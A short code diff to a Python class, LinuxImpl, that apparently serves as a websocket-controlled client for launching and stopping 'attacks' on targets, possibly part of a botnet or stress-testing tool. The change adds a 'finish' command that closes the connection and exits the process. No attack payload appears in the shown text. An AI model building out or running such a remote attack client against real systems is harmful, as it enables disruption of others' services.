@@ -70,6 +70,8 @@ class LinuxImpl:
                 await self._handle_attack_command(ws, data)
             elif 'stop_attack' in data:
                 await self._stop_attack(ws, attack_type=data['stop_attack'])
+            elif 'finish' in data:
+                await self._exit(ws)
         
         except ConnectionClosedError:
             pass
@@ -499,6 +501,12 @@ class LinuxImpl:
                         self._notify_attack_completed(ws, attack_type, attack['target']),
                         attack['loop']
                     )
+
+        
+    async def _exit(self, ws):
+        
+        await ws.close()
+        sys.exit(0)
 
     
     async def register(self) -> None:
